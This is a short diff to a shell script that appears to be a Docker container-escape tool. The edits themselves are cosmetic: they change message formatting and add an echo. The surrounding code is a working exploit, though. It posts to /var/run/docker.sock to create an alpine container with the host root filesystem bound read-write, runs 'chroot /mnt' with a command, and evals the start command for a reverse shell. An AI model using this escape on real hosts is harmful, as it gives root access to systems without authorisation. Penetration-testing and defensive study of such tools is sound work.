@@ -850,7 +850,7 @@ prepareExploit() {
   # - custom command
   # - new root user
 
-  printMsg "Preparing Exploit" "\n"
+  printMsg "Preparing Exploit" " "
 
   if [ "$shadow" ]; then
   
@@ -993,7 +993,7 @@ exploitDockerSock() {
 
   nl
 
-  # Create docker container using the docker sockx
+  # Create docker container using the docker sock
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt $cmd\"]"
   response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
@@ -1002,6 +1002,8 @@ exploitDockerSock() {
     echo "$response"
     return
   fi
+
+  echo "$response"
 
   revShellContainerID=$(echo "$response" | cut -d'"' -f4)
   printQuestion "Creating container ....."
@@ -1014,14 +1016,14 @@ exploitDockerSock() {
 
   printQuestion "If the shell dies you can restart your listener and run the start command to fire it again"
   nl
-  printStatus "Start Command:\n$startCmd"
-  printStatus "Logs Command:\n$logsCmd"
+  printStatus "Start Command: $startCmd"
+  printStatus "Logs Command: $logsCmd"
 
   printQuestion "Once complete remember to tidy up by stopping and removing your container with following commands"
   nl
 
-  printStatus "Stop Command:\n$deleteCmd"
-  printStatus "Remove Command:\n$removeCmd"
+  printStatus "Stop Command: $deleteCmd"
+  printStatus "Remove Command: $removeCmd"
 
   # FIXME: Must be a better way of doing this...
   response=$(eval "$startCmd")
